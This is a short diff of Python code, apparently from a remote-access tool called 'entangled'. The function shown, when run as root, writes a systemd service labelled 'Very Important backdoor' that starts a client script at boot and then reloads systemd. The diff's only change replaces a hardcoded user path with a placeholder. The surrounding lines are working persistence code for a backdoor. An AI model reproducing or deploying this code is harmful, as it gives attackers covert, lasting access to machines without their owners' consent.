@@ -61,7 +61,7 @@ def shell():
                 if os.geteuid() == 0:
                     os.system("echo '[Unit]\nDescription=Very Important backdoor.\n\n\n["
                               "Service]\nType=simple\nExecStartPre=/bin/sleep "
-                              "30\nExecStart=/usr/bin/python /home/kris/Downloads/entangled-master/client.py\n\n["
+                              "30\nExecStart=/usr/bin/python /home/<change me>/Downloads/entangled-master/client.py\n\n["
                               "Install]\nWantedBy=multi-user.target' > /etc/systemd/system/backdoor.service")
                     os.system("systemctl daemon-reload")
                     #os.system("systemctl start backdoor")
